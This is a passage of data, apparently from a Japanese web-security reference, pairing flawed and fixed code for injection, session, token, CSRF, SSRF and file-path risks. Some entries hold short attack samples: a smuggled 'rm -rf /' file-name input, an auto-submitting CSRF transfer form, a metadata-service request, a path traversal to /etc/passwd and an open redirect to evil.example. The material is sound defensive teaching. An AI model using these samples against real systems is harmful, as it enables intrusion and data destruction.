DB で使える。","対策",{"ex":"// Java (JDBC)\nvar ps = con.prepareStatement(\"SELECT * FROM users WHERE name = ?\");\nps.setString(1, name);\n\n// Node (mysql2)\nconn.execute(\"SELECT * FROM users WHERE name = ?\", [name]);\n\n// Python\ncur.execute(\"SELECT * FROM users WHERE name = %s\", (name,))","u":3}],["対策: ORM でも油断しない","生 SQL の口が残っている","**`@Query` の文字列連結、`createQuery` の連結、`raw`／`literal` 系**は素通しになる。ORM を使っていること自体は対策ではない。","対策",{"ex":"// NG\n@Query(\"select u from User u where u.name = '\" + name + \"'\")\n\n// OK\n@Query(\"select u from User u where u.name = :name\")\nUser find(@Param(\"name\") String name);","u":3}],["プレースホルダが使えない場所","テーブル名・列名・ORDER BY","**識別子は値ではないのでプレースホルダに置けない**。ここだけは許可リストで対応する。","対策",{"ex":"// NG\n\"SELECT * FROM t ORDER BY \" + column\n\n// OK\nconst allowed = { name: \"name\", date: \"created_at\" };\nconst col = allowed[column];\nif (!col) throw new Error(\"invalid sort key\");","u":3}],["対策: 権限を絞る","成立しても被害を減らす","**アプリ用の DB ユーザーに `DROP` や `GRANT` を与えない**。読み取り専用の経路は読み取り専用ユーザーで繋ぐ。","対策",{"ex":"GRANT SELECT, INSERT, UPDATE, DELETE ON app.* TO 'app'@'%';\n-- DDL と管理権限は与えない","u":3}],["対策: エラーを外に出さない","手掛かりを与えない","**SQL のエラーメッセージには表名や列名が載る**。利用者には一般的なメッセージだけ返し、詳細はログへ。","対策",{"ex":"// 利用者へ: {\"error\":\"処理できませんでした\",\"requestId\":\"7f3c...\"}\n// ログへ:  完全なスタックトレース","u":2}],["よくある誤解: エスケープすれば足りる","取りこぼしが起きる","**文字コードや DB の設定次第で、エスケープをすり抜ける**（マルチバイト文字による `\\` の消費など）。プレースホルダなら考えなくてよい。","誤解",{"ex":"// 自前のエスケープに賭けない\ninput.replace(/'/g, \"''\")   // 文字コード次第で抜ける","u":3}]]},{"g":"inject","id":"cmdi","t":"コマンド・その他の注入","note":"SQL 以外にも、文字列を連結して外部の処理系へ渡す場所はすべて同じ危険がある。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["OS コマンドインジェクション","サーバー上で任意のコマンドが動く","**`;` `&&` `|` `` ` `` `$()` で別のコマンドを継ぎ足される**。成立するとサーバーそのものを取られるため、被害は最大級。","概要",{"ex":"// 入力: file.txt; rm -rf /\nexec(\"convert \" + filename + \" out.png\");","u":3,"tag":"重大"}],["対策: シェルを経由しない","引数を配列で渡す","**シェルを挟まなければ、記号はただの文字**になる。`shell: true` や `exec` ではなく、引数配列を取る API を使う。","対策",{"ex":"// NG\nchild_process.exec(`convert ${file} out.png`);\n\n// OK\nchild_process.execFile(\"convert\", [file, \"out.png\"]);\n\n// Java\nnew ProcessBuilder(\"convert\", file, \"out.png\").start();","u":3}],["対策: そもそも外部コマンドを避ける","ライブラリで済ませる","**画像処理や圧縮はライブラリでできる**ことが多い。外部コマンドを呼ばなければ、この脆弱性は原理的に存在しない。","対策",{"ex":"// 外部コマンドの代わりにライブラリを使う","u":2}],["テンプレートインジェクション (SSTI)","テンプレート構文が評価される","**ユーザー入力をテンプレート「文字列」として渡すと式が実行される**。多くのエンジンでオブジェクトを辿られ、最終的にコマンド実行に至る。","概要",{"ex":"// NG: 入力をテンプレートとして評価している\nengine.render(userInput, model);\n\n// OK: 入力は「値」として渡す\nengine.render(\"greeting.html\", { name: userInput });","u":3}],["LDAP インジェクション","検索条件を書き換えられる","`(` `)` `*` `\\` `NUL` が制御文字。**認証の迂回や、全ユーザーの列挙**につながる。専用のエスケープ関数を使う。","概要",{"ex":"// NG\n\"(uid=\" + user + \")\"    // 入力: *)(uid=*\n\n// OK: フィルタのエスケープを通す","u":2}],["CRLF インジェクション","ヘッダを割り込ませる","**改行コードを入れられると、ヘッダを追加したり本文を偽造したりできる**。リダイレクト先やファイル名を外部から受けるときに起きる。","概要",{"ex":"// 入力に %0d%0a が含まれると Set-Cookie を追加されうる\nres.setHeader(\"Location\", userInput);   // 改行を除去してから","u":2}],["ログインジェクション","ログを偽造される","**改行を入れて偽の行を追加**したり、ログビューアが HTML 表示なら XSS になる。ログに出す前に改行と制御文字を落とす。","概要",{"ex":"log.info(\"login user={}\", user.replaceAll(\"[\\r\\n]\", \"\"));","u":2}],["安全でないデシリアライズ","データの復元だけで任意コード実行","**Java の `ObjectInputStream`、PHP の `unserialize`、Python の `pickle`** は、復元の過程でオブジェクトのメソッドが動く。外部から来たバイト列を渡してはいけない。","概要",{"ex":"// 危険: 外部由来のデータを復元している\nnew ObjectInputStream(request.getInputStream()).readObject();\n\n// 安全側: JSON など「データだけ」の形式を使う","u":3,"tag":"重大"}],["XXE（XML 外部実体参照）","サーバーのファイルを読まれる","**XML の外部実体をたどってローカルファイルや内部 URL を読み出される**。SSRF の踏み台にもなる。パーサ側で外部実体を無効にする。","概要",{"ex":"var f = DocumentBuilderFactory.newInstance();\nf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nf.setXIncludeAware(false);\nf.setExpandEntityReferences(false);","u":3}]]},{"g":"session","id":"session","t":"セッション管理","note":"**セッション ID は「ログイン済みである」ことの証**。これを他人に渡すと、パスワードを知らなくても本人として振る舞える。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["セッションハイジャックとは","他人のセッション ID で成りすまされる","**ID さえ手に入れば、認証をやり直す必要がない**。パスワード変更もMFAも、既に発行済みのセッションには効かない。だから「盗ませない」と「短く保つ」の両方が要る。","概要",{"ex":"Cookie: session=8f3c1ab9...   ← これを持っている人＝本人 と扱われる","u":3}],["盗まれる経路","どこから漏れるか","**① XSS で JS から読む ② 平文通信を盗聴 ③ URL に載せて履歴やリファラから漏れる ④ 端末の共有 ⑤ ログに出力**。経路ごとに対策が違う。","概要",{"ex":"// ④⑤ は見落としやすい\n// アクセスログに Cookie を出していないか","u":3}],["対策: HttpOnly","JS から読めなくする","**XSS が成立してもセッション ID は取られない**。付けない理由は基本的に無い。","対策",{"ex":"Set-Cookie: session=...; HttpOnly","u":3}],["対策: Secure","HTTPS でのみ送る","**平文の HTTP に載らなくなる**。公衆無線などでの盗聴を防ぐ。","対策",{"ex":"Set-Cookie: session=...; Secure","u":3}],["対策: SameSite","他サイトからの送信を抑える","**CSRF への効果が大きい**。`Lax` が既定で、トップレベル遷移の GET 以外では送られない。埋め込みが必要なら `None; Secure`。","対策",{"ex":"Set-Cookie: session=...; SameSite=Lax","u":3}],["対策: ログイン時に ID を作り直す","セッション固定化を防ぐ","**攻撃者が用意した ID をログイン前に押し付けられる**のがセッション固定化。ログインの瞬間に必ず新しい ID を発行すれば無効化できる。権限が変わる操作でも同様。","対策",{"ex":"// Servlet\nrequest.changeSessionId();\n\n// Spring Security は既定で有効\n.sessionManagement(s -> s.sessionFixation().changeSessionId())","u":3}],["対策: 十分な長さと乱数の質","推測させない","**暗号論的に安全な乱数で 128 ビット以上**。連番、時刻、ユーザー ID から作ってはいけない。フレームワーク標準の生成器を使う。","対策",{"ex":"// NG\nsessionId = userId + \"-\" + Date.now();\n\n// OK\ncrypto.randomBytes(32).toString(\"base64url\");","u":3}],["対策: 失効させる","寿命と無操作タイムアウト","**絶対有効期限（例: 12時間）と無操作タイムアウト（例: 30分）の両方**を設ける。ログアウトではサーバー側の状態も必ず破棄する。","対策",{"ex":"server.servlet.session.timeout=30m\n// ログアウト時\nsession.invalidate();   // Cookie を消すだけでは不十分","u":3}],["対策: URL に入れない","リファラと履歴から漏れる","**`;jsessionid=` のような URL 埋め込みは無効化する**。共有された URL がそのまま鍵になってしまう。","対策",{"ex":"server.servlet.session.tracking-modes=cookie","u":3}],["対策: 異常の検知","使われ方の変化を見る","**IP や User-Agent の急変、同時多発ログイン**を検知して再認証を求める。厳しくしすぎると正規の利用者を締め出すので、遮断ではなく再認証が現実的。","対策",{"ex":"// 大きな変化があれば再認証を要求する","u":2}],["サーバー側セッション と トークン","どちらを選ぶか","**サーバー側セッションは即座に失効できる**。JWT のような自己完結トークンは失効が難しく、短命化＋リフレッシュで補う。「ログアウトで即無効」が要るならサーバー側が向く。","設計",{"ex":"// セッション: 失効させやすい / 状態を持つ\n// JWT:      拡張しやすい / 失効しにくい","u":3}],["よくある誤解: Cookie を消せばログアウト","サーバー側が残る","**ブラウザの Cookie を消しても、盗まれた ID は生きている**。ログアウトは必ずサーバー側の破棄とセットにする。","誤解",{"ex":"// NG: Cookie を消すだけ\nres.clearCookie(\"session\");\n\n// OK: サーバー側も破棄\nsession.invalidate(); res.clearCookie(\"session\");","u":3}]]},{"g":"session","id":"authn","t":"認証","note":"**「本人であること」の確認**。ここが破られると他のすべての対策が意味を失う。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["パスワードの保存","漏洩時に平文で流出する","**必ずハッシュ化する。しかも「遅い」ハッシュで**。`bcrypt` `Argon2id` `scrypt` を使う。SHA-256 や MD5 は速すぎて総当たりに耐えられない。ソルトは自動で付く。","対策",{"ex":"// Java (Spring Security)\nnew BCryptPasswordEncoder(12).encode(raw);\n\n// Node\nawait argon2.hash(raw, { type: argon2.argon2id });","u":3}],["総当たり攻撃","片端から試される","**回数制限とアカウントロック**で対処する。ただし固定ロックは嫌がらせに使われるため、**段階的な遅延**や CAPTCHA と併用する。","対策",{"ex":"// 5回失敗で 1分、10回で 15分 のように伸ばす\n// IP 単位とアカウント単位の両方で数える","u":3}],["クレデンシャルスタッフィング","他所で漏れた組を試される","**使い回しが原因**なので、強度ルールだけでは防げない。**MFA と、漏洩済みパスワードの照合**（Have I Been Pwned の k-匿名 API など）が効く。","対策",{"ex":"// 漏洩リストと突き合わせて、既知のものは登録させない","u":3}],["多要素認証 (MFA)","盗まれても入られない","**パスワード漏洩に対する最も費用対効果の高い対策**。TOTP は手軽、パスキー（WebAuthn）はフィッシングにも耐える。SMS は SIM スワップに弱い。","対策",{"ex":"// 強さ: パスキー > TOTP > SMS","u":3}],["パスワードリセットの穴","ここから乗っ取られる","**トークンは推測不能・単回・短命**にする。「メールアドレスが存在するか」を応答で区別しないこと。**リセット後はセッションを全部無効化**する。","対策",{"ex":"// 発行: 乱数32バイト / 有効15分 / 1回で失効\n// 完了後: そのユーザーの全セッションを破棄","u":3}],["ユーザー列挙","アカウントの存在が分かる","**「そのメールは登録されていません」は情報を与える**。応答文と応答時間の両方を揃える。","対策",{"ex":"// 常に同じ応答\n\"入力されたアドレス宛に手順を送りました\"","u":3}],["パスワード強度の考え方","複雑さより長さ","**記号を強制するより、長さの下限（12文字以上）と使い回しの排除**のほうが効く。定期変更の強制は、単純な変形を招くため今は推奨されない。","対策",{"ex":"// 12文字以上 / 漏洩済みは拒否 / 定期変更は強制しない","u":3}],["タイミング攻撃","応答時間で正解が分かる","**比較を1文字ずつ打ち切ると時間差が出る**。トークンや署名の比較は、長さに依存しない比較関数を使う。","対策",{"ex":"// Node\ncrypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));\n\n// Java\nMessageDigest.isEqual(a, b);","u":2}]]},{"g":"session","id":"authz","t":"認可","note":"**「その人がその操作をしてよいか」の確認**。認証と混同されやすく、実装漏れが最も多い領域。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["認証と認可の違い","別々の確認","**認証は「誰か」、認可は「してよいか」**。ログイン済みであることは、その資源を触ってよい理由にはならない。","概要",{"ex":"// 認証: あなたは alice だ\n// 認可: alice は注文42を見てよいか？","u":3}],["IDOR / 水平権限昇格","他人のデータが見える","**URL の ID を変えるだけで他人の資源にアクセスできる**。最も多く、最も見つけやすい欠陥。「画面に出していないから大丈夫」は通用しない。","概要",{"ex":"// /orders/1042 を /orders/1043 に変えて試される\n// 対策: 所有者の確認を必ず行う","u":3,"tag":"重大"}],["対策: 所有者を条件に含める","取得の時点で絞る","**取得してから確認するのではなく、クエリに所有者を入れる**。確認の書き忘れが構造的に起きなくなる。","対策",{"ex":"// NG\nOrder o = repo.findById(id);\nif (!o.getOwnerId().equals(me)) throw ...;   // 書き忘れる\n\n// OK\nOrder o = repo.findByIdAndOwnerId(id, me)\n              .orElseThrow(NotFoundException::new);","u":3}],["垂直権限昇格","一般利用者が管理機能を使える","**画面にボタンが無いだけで、API は叩ける**。URL を隠すことは対策ではない。サーバー側で毎回役割を確認する。","概要",{"ex":"curl -X DELETE https://example.com/api/users/1 -H \"Cookie: session=...\"","u":3}],["対策: 既定を拒否にする","書き忘れが穴にならない構え","**「認可を書いた場所だけ守られる」から「書かない限り拒否」へ**反転させる。フレームワークの設定で既定を閉じる。","対策",{"ex":".authorizeHttpRequests(a -> a\n    .requestMatchers(\"/public/**\").permitAll()\n    .anyRequest().authenticated())   // 既定は拒否","u":3}],["マスアサインメント","送られた項目が全部保存される","**`role` や `isAdmin` を勝手に送られて権限が上がる**。受け取る項目を DTO で明示して絞る。","概要",{"ex":"// NG: リクエストをそのままエンティティに束ねる\n// OK: 受け取ってよい項目だけの record を作る\nrecord UserUpdate(String name, String email) { }","u":3}],["対策: 存在を隠す","404 と 403 の使い分け","**403 は「在るが見せない」と伝えてしまう**。存在自体を隠したい資源は 404 を返す。","対策",{"ex":"// 他人の注文 → 404 として扱う","u":2}],["よくある誤解: 画面制御で足りる","API は直接叩ける","**ボタンの非表示は UX であって認可ではない**。すべての入口（API、バッチ、管理画面）で同じ判定を通す。","誤解",{"ex":"// 画面: ボタンを隠す（親切）\n// API:  権限を確認する（防御）","u":3}]]},{"g":"session","id":"token","t":"トークン・JWT","note":"**持っているだけで通る**のがトークン。だから寿命と保管場所の設計がすべて。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["JWT の中身は誰でも読める","秘密を入れてはいけない","**base64url なだけで暗号化ではない**。ペイロードは誰でも復元できる。個人情報や内部 ID を入れない。","誤解",{"ex":"// 貼れば中身が読める\necho \"eyJzdWIiOiIxIn0\" | base64 -d","u":3}],["alg=none / アルゴリズム混同","署名を無効化される","**`alg` をトークン側から指定させると破られる**。検証側で使うアルゴリズムを固定する。公開鍵を HMAC の鍵として使わせる攻撃もある。","概要",{"ex":"// 検証時にアルゴリズムを固定する\nJWT.require(Algorithm.HMAC256(secret)).build().verify(token);","u":3,"tag":"重大"}],["失効できない問題","ログアウトが効かない","**署名が正しければ有効期限まで通る**。サーバー側に状態を持たないのが利点であり弱点。**短命なアクセストークン＋失効可能なリフレッシュトークン**で補う。","設計",{"ex":"// アクセストークン: 5〜15分\n// リフレッシュトークン: 保存して失効可能にする","u":3}],["保管場所","localStorage か Cookie か","**localStorage は XSS で読まれる**。`HttpOnly` Cookie なら読まれないが CSRF 対策が要る。**Cookie + SameSite + CSRF 対策**の組み合わせが堅い。","設計",{"ex":"// localStorage: XSS に弱い\n// HttpOnly Cookie + SameSite=Lax + CSRF トークン","u":3}],["検証すべきクレーム","署名だけでは足りない","**`exp`（期限）`iss`（発行者）`aud`（対象）を必ず確認**する。他システム向けのトークンを受け入れてしまう事故が起きる。","対策",{"ex":".withIssuer(\"https://auth.example.com\")\n.withAudience(\"https://api.example.com\")","u":3}],["リフレッシュトークンの回転","漏洩に気づける","**使うたびに新しい物へ入れ替え、古い物が再使用されたら盗難とみなして全部失効**させる。","対策",{"ex":"// 再使用を検知したら、その家系のトークンをすべて無効化する","u":2}],["PKCE","認可コードの横取りを防ぐ","**公開クライアント（SPA・モバイル）では必須**。事前に送った検証値と一致しないとトークンに交換できない。","対策",{"ex":"code_challenge=BASE64URL(SHA256(verifier))&code_challenge_method=S256","u":3}],["API キーの扱い","埋め込まない・回せるようにする","**リポジトリやフロントエンドに置かない**。秘密管理サービスに置き、定期的に入れ替えられる構造にする。漏洩時に即無効化できることが重要。","対策",{"ex":"// 環境変数 or Secrets Manager から読む\n// リポジトリに入っていないか: git log -p で履歴も確認","u":3}]]},{"g":"client","id":"csrf","t":"CSRF（クロスサイトリクエストフォージェリ）","note":"**被害者のブラウザに、意図しない操作を送らせる**。ブラウザが Cookie を自動で付ける性質を悪用する。攻撃者は応答を読めないが、書き込みは通る。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["CSRF とは","本人の意思なく操作が実行される","**罠のページを開くだけで、ログイン中のサイトに勝手なリクエストが飛ぶ**。Cookie は自動で付くので、サーバーからは本人の操作に見える。送金、退会、設定変更が狙われる。","概要",{"ex":"<!-- 罠サイトに置かれる -->\n<form action=\"https://bank.example/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker\"><input name=\"amount\" value=\"100000\">\n</form>\n<script>document.forms[0].submit()</script>","u":3}],["XSS との違い","読めるか、書けるか","**CSRF は応答を読めない**（同一オリジンポリシーが働く）。書き込み操作だけが成立する。XSS は読み書き両方できるので、XSS があれば CSRF 対策は無意味になる。","概要",{"ex":"// CSRF: 送れるが結果は見えない\n// XSS:  何でもできる","u":3}],["対策: SameSite Cookie","最初の防波堤","**`Lax` なら他サイトからの POST に Cookie が付かない**。主要ブラウザの既定でもある。ただし古い環境や、意図的に `None` にした場合は効かない。","対策",{"ex":"Set-Cookie: session=...; SameSite=Lax; Secure; HttpOnly","u":3}],["対策: CSRF トークン","本命の対策","**画面に埋めた秘密の値を送り返させる**。攻撃者は他オリジンからその値を読めないため、正しい値を付けられない。","対策",{"ex":"<form method=\"post\" action=\"/transfer\">\n  <input type=\"hidden\" name=\"_csrf\" value=\"{{token}}\">\n</form>\n\n// サーバー側: セッションの値と一致しなければ拒否","u":3}],["対策: Origin / Referer の検証","追加の確認","**`Origin` ヘッダは偽装できない**（ブラウザが付ける）。トークンと併用すると堅い。`Origin` が無い場合の扱いを決めておく。","対策",{"ex":"const origin = req.headers.origin;\nif (origin && origin !== \"https://app.example.com\") return res.sendStatus(403);","u":3}],["対策: 安全なメソッドを守る","GET で状態を変えない","**GET で更新できると、`<img src>` だけで攻撃が成立**する。更新は必ず POST / PUT / PATCH / DELETE にする。","対策",{"ex":"<!-- これだけで実行されてしまう -->\n<img src=\"https://example.com/delete?id=42\">","u":3}],["SPA + トークンの場合","Cookie を使わないなら","**`Authorization` ヘッダは自動送信されない**ので CSRF は原理的に起きない。ただしトークンを Cookie に置いた瞬間に対策が必要になる。","設計",{"ex":"// ヘッダ送信 → CSRF なし（代わりに XSS のリスクが増える）\n// Cookie 送信 → CSRF 対策が必要","u":3}],["よくある誤解: JSON なら安全","条件付きでしか正しくない","**`Content-Type: text/plain` にしてフォームから JSON 風の本文を送られる**手口がある。サーバー側で Content-Type を厳格に確認する。","誤解",{"ex":"// application/json 以外は拒否する\nif (!req.is(\"application/json\")) return res.sendStatus(415);","u":3}]]},{"g":"client","id":"clickjack","t":"クリックジャッキング・UI の詐取","note":"**画面を重ねて、押したつもりのないボタンを押させる**。入力ではなく「操作」を盗む。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["クリックジャッキング","透明な枠越しに操作させられる","**攻撃者のページに本物のサイトを透明な iframe で重ねる**。利用者は罠のボタンを押したつもりで、実際には本物の「削除」や「連携許可」を押している。","概要",{"ex":"<iframe src=\"https://example.com/settings\" style=\"opacity:0;position:absolute\"></iframe>\n<button>ここをクリック</button>","u":3}],["対策: frame-ancestors","埋め込みを禁じる","**CSP の `frame-ancestors` が現行の方法**。`none` で完全禁止、`self` で自サイト内のみ許可。","対策",{"ex":"Content-Security-Policy: frame-ancestors 'none'","u":3}],["対策: X-Frame-Options","古い環境向け","**`frame-ancestors` の前身**。併記されることが多いが、両方あれば CSP が優先される。","対策",{"ex":"X-Frame-Options: DENY","u":3}],["タブナビング","開いた元のタブを書き換えられる","**`target=\"_blank\"` で開いたページから `window.opener` を通じて元のタブを別サイトに飛ばされる**。偽のログイン画面に差し替えられる。","概要",{"ex":"<!-- 対策 -->\n<a href=\"https://other.example\" target=\"_blank\" rel=\"noopener noreferrer\">…</a>","u":3}],["オープンリダイレクト","自サイト経由で偽サイトへ飛ばされる","**遷移先を外部から受け取ってそのまま使う**と、正規ドメインのリンクとして偽サイトへ誘導される。フィッシングの信頼度を上げる踏み台にされる。","概要",{"ex":"// 罠: https://example.com/login?next=https://evil.example\n\n// 対策: 相対パスだけ許す\nif (!/^\\/[^\\/\\\\]/.test(next)) next = \"/\";","u":3}],["postMessage の受け口","任意のサイトから呼ばれる","**送信元を確認しないと、どのサイトからでもメッセージを送れる**。`origin` を必ず検証し、送る側も宛先を `*` にしない。","概要",{"ex":"window.addEventListener(\"message\", (e) => {\n  if (e.origin !== \"https://trusted.example\") return;   // 必須\n  handle(e.data);\n});","u":3}]]},{"g":"client","id":"csp","t":"CSP（コンテンツセキュリティポリシー）","note":"**読み込んでよい資源を宣言する**。XSS が起きても実行させないための保険。導入は Report-Only から始める。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["CSP の考え方","許可リストで実行を絞る","**「どこから来たスクリプトなら動かしてよいか」を宣言する**。宣言外のものはブラウザが実行を拒む。XSS の被害を大きく減らせる。","概要",{"ex":"Content-Security-Policy: default-src 'self'","u":3}],["script-src","最重要の指示","**`unsafe-inline` を外すことが本質**。これが付いていると、埋め込まれた `<script>` が動いてしまい、CSP の意味がほぼ失われる。","対策",{"ex":"script-src 'self' https://cdnjs.cloudflare.com","u":3}],["nonce","インラインを安全に許す","**リクエストごとに変わる乱数**を付け、その値を持つ script だけ実行させる。攻撃者は値を知り得ない。","対策",{"ex":"Content-Security-Policy: script-src 'nonce-r4nd0m1234'\n\n<script nonce=\"r4nd0m1234\">...</script>","u":3}],["strict-dynamic","依存の読み込みを許す","**信頼した script が読み込む script も許可する**。CDN の許可リストを長々と書かずに済む。","対策",{"ex":"script-src 'nonce-abc' 'strict-dynamic'","u":2}],["object-src / base-uri","見落としやすい2つ","**`object-src none`** でプラグイン経由の実行を塞ぎ、**`base-uri self`** で `<base>` タグによる相対 URL の乗っ取りを防ぐ。","対策",{"ex":"object-src 'none'; base-uri 'self'","u":3}],["frame-ancestors","埋め込みの制限","クリックジャッキング対策。**`X-Frame-Options` の後継**。","対策",{"ex":"frame-ancestors 'none'","u":3}],["Report-Only で始める","壊さずに導入する","**まず違反を集めるだけのモードで様子を見る**。既存の機能を壊さずに、どこを直す必要があるか分かる。","運用",{"ex":"Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report","u":3}],["よくある落とし穴","効いていないポリシー","**`unsafe-inline` と `unsafe-eval` が入ったままだと守れない**。`default-src *` も同様。設定した気になっている状態が一番危ない。","誤解",{"ex":"// 実質無効\nscript-src 'self' 'unsafe-inline' 'unsafe-eval'","u":3}]]},{"g":"server","id":"ssrf","t":"SSRF・外部への通信","note":"**サーバーに、攻撃者の指定した先へ通信させる**。クラウドではメタデータサービスから認証情報を抜かれる事故につながる。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["SSRF とは","サーバーを踏み台にされる","**URL を外部から受け取って取得する機能**が入口。ファイアウォールの内側にいるサーバーから、内部 API や管理画面へ到達される。","概要",{"ex":"// 画像取得やWebhookの検証などが入口になる\nGET /fetch?url=http://169.254.169.254/latest/meta-data/","u":3,"tag":"重大"}],["クラウドでの危険","認証情報が取られる","**インスタンスメタデータから一時認証情報を取得**され、そのままクラウド全体を触られる。AWS なら IMDSv2 を必須にすると単純な GET では取れなくなる。","概要",{"ex":"// AWS: IMDSv2 を必須にする\naws ec2 modify-instance-metadata-options \\\n  --http-tokens required --http-endpoint enabled","u":3,"tag":"重大"}],["対策: 許可リスト","ホストを限定する","**「危険な宛先を弾く」ではなく「許す宛先だけ通す」**。DNS の解決結果まで確認しないと、名前を使って内部 IP に向けられる。","対策",{"ex":"// ホスト名の許可リスト + 解決後の IP も確認する\nconst { address } = await dns.lookup(url.hostname);\nif (isPrivate(address)) throw new Error(\"blocked\");","u":3}],["対策: リダイレクトを追わない","検証の後に飛ばされる","**最初は安全な URL、リダイレクト先が内部**という手口がある。自動追従を切るか、追従のたびに検証する。","対策",{"ex":"fetch(url, { redirect: \"manual\" });","u":3}],["対策: 出口を絞る","ネットワーク側で止める","**アプリの通信先をセキュリティグループやプロキシで限定する**。コードの検証漏れがあっても届かなくなる。","対策",{"ex":"// 出口プロキシ経由のみ許可し、そこで宛先を制限する","u":2}],["危険なスキーム","http 以外も届く","**`file://` `gopher://` `dict://`** などでローカルファイルや別プロトコルに到達される。スキームも許可リストで縛る。","対策",{"ex":"if (![\"http:\", \"https:\"].includes(u.protocol)) throw new Error(\"invalid\");","u":3}]]},{"g":"server","id":"file","t":"ファイル・パス","note":"**パスとファイル名を外部から受け取る**すべての場所が対象。読み出しと書き込みの両方に危険がある。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["パストラバーサル","任意のファイルを読まれる","**`../` を重ねて公開範囲の外へ出られる**。設定ファイルや秘密鍵が読み出される。URL デコード後や二重符号化にも注意。","概要",{"ex":"GET /files?name=../../../../etc/passwd","u":3,"tag":"重大"}],["対策: 正規化して基準の下か確認","確実な方法","**パスを解決してから、許可した基準ディレクトリの下にあるかを判定する**。文字列の置換で `../` を消す方法は取りこぼす。","対策",{"ex":"// Java\nPath base = Paths.get(\"/var/app/files\").toRealPath();\nPath target = base.resolve(name).normalize();\nif (!target.startsWith(base)) throw new SecurityException();","u":3}],["対策: 名前を受け取らない","識別子で引く","**ファイル名ではなく ID を受け取り、実体の場所はサーバーが決める**。この設計なら脆弱性が原理的に発生しない。","対策",{"ex":"// /files/8f3c1ab9  →  DB から実ファイル名を引く","u":3}],["アップロード: 保存場所","公開領域に置かない","**Web から直接参照できる場所に置くと、実行される可能性がある**。公開領域外に保存し、アプリ経由で配信する。","対策",{"ex":"// NG: /var/www/html/uploads/\n// OK: /var/app/storage/  →  ダウンロードは認可付きの API で","u":2}],["アップロード: 種類の判定","拡張子を信用しない","**中身（マジックナンバー）で判定する**。拡張子と Content-Type はどちらも自己申告。保存名は自分で採番する。","対策",{"ex":"// PNG: 89 50 4E 47 / JPEG: FF D8 FF\n// 保存名は UUID + 判定した拡張子","u":3}],["アップロード: 配信時のヘッダ","ブラウザに解釈させない","**`X-Content-Type-Options: nosniff` と `Content-Disposition: attachment`** を付ける。HTML として解釈されると格納型 XSS になる。","対策",{"ex":"X-Content-Type-Options: nosniff\nContent-Disposition: attachment; filename=\"report.pdf\"","u":3}],["ZIP 爆弾・展開先","展開でディスクを埋められる","**圧縮ファイルの展開時にサイズと件数の上限を設ける**。エントリ名に `../` が入る「Zip Slip」も確認する。","対策",{"ex":"// 展開前に: 総サイズ上限 / 件数上限 / エントリ名の検証","u":2}]]},{"g":"server","id":"misconfig","t":"設定と情報漏れ","note":"**コードは正しくても、設定で穴が空く**。実際の事故はここが原因のことが非常に多い。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["エラーの詳細表示","内部構造が漏れる","**スタックトレースやSQLがそのまま画面に出る**と、攻撃の地図を渡すことになる。本番では一般的なメッセージと相関 ID だけ返す。","概要",{"ex":"// 利用者へ: {\"error\":\"処理できませんでした\",\"requestId\":\"7f3c...\"}\n// ログへ:  詳細すべて","u":3}],["既定の認証情報","そのまま使われる","**管理画面の初期パスワード、サンプルのAPIキー**が残っていないか。導入直後の確認項目。","概要",{"ex":"// admin/admin, root/root, guest/guest","u":3,"tag":"重大"}],["開放されたポート","意図せず公開される","**Redis・MongoDB・Elasticsearch は既定で認証が無い**。公開すると即座に走査され、データを抜かれるか身代金要求ノートを置かれる。","概要",{"ex":"ss -tulnp | grep -v 127.0.0.1   # 外向きに開いているものを確認","u":3,"tag":"重大"}],["ディレクトリ一覧","意図しないファイルが見える","Web サーバーの一覧表示を切る。**`.git` `.env` `backup.zip` の公開**は定番の事故。","概要",{"ex":"// 確認\ncurl -I https://example.com/.git/config\ncurl -I https://example.com/.env","u":3}],["デバッグ機能の残存","本番で有効なまま","**Actuator、デバッグエンドポイント、GraphQL のイントロスペクション、ソースマップ**。環境ごとに切り替える。","概要",{"ex":"management.endpoints.web.exposure.include=health,info\n// heapdump や env を公開しない","u":3}],["シークレットの混入","リポジトリに入る","**一度コミットしたら履歴に残る**。消しても pull 済みの手元には残るため、**発見したら必ず鍵を無効化して作り直す**。","概要",{"ex":"// 履歴も含めて検索\ngit log -p | grep -iE \"password|secret|api[_-]?key\"\n// 検出ツールを CI に入れる（gitleaks 等）","u":3,"tag":"重大"}],["CORS の緩すぎる設定","誰からでも読める","**`Origin` をそのまま反射して `Allow-Credentials: true`** にすると、任意のサイトから認証付きで読み出せる。実質的に全公開。","概要",{"ex":"// 危険\nres.header(\"Access-Control-Allow-Origin\", req.headers.origin);\nres.header(\"Access-Control-Allow-Credentials\", \"true\");","u":3,"tag":"重大"}],["バージョン情報の露出","既知の脆弱性を狙われる","**`Server` ヘッダや `X-Powered-By`** で製品と版が分かると、既知の攻撃を直接試される。隠すこと自体は防御ではないが、手間を増やせる。","概要",{"ex":"server_tokens off;              # nginx\napp.disable(\"x-powered-by\");    # Express","u":2}],["サプライチェーン","依存ライブラリから侵入される","**自分のコードより依存の行数のほうが多い**。バージョンを固定し、脆弱性の通知を受け取り、更新を定期作業にする。","概要",{"ex":"npm audit --production\n// Dependabot / Renovate で更新を自動提案させる","u":3}]]},{"g":"crypto","id":"crypto","t":"暗号と秘密情報","note":"**自作しない、枯れたものを使う、鍵を回せるようにする**。この3つを守れば大半は避けられる。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["自作しない","必ず穴が開く","**暗号方式もプロトコルも自作しない**。標準ライブラリと、広く検証されたアルゴリズムを使う。「独自方式だから解けない」は成り立たない。","原則",{"ex":"// 使うもの: AES-GCM / ChaCha20-Poly1305 / Argon2id / SHA-256","u":3}],["ハッシュと暗号化の違い","用途が違う","**ハッシュは戻せない（パスワード向け）、暗号化は鍵で戻せる（保管向け）**。パスワードを暗号化して保存するのは誤り。復号できてしまう。","原則",{"ex":"// パスワード → 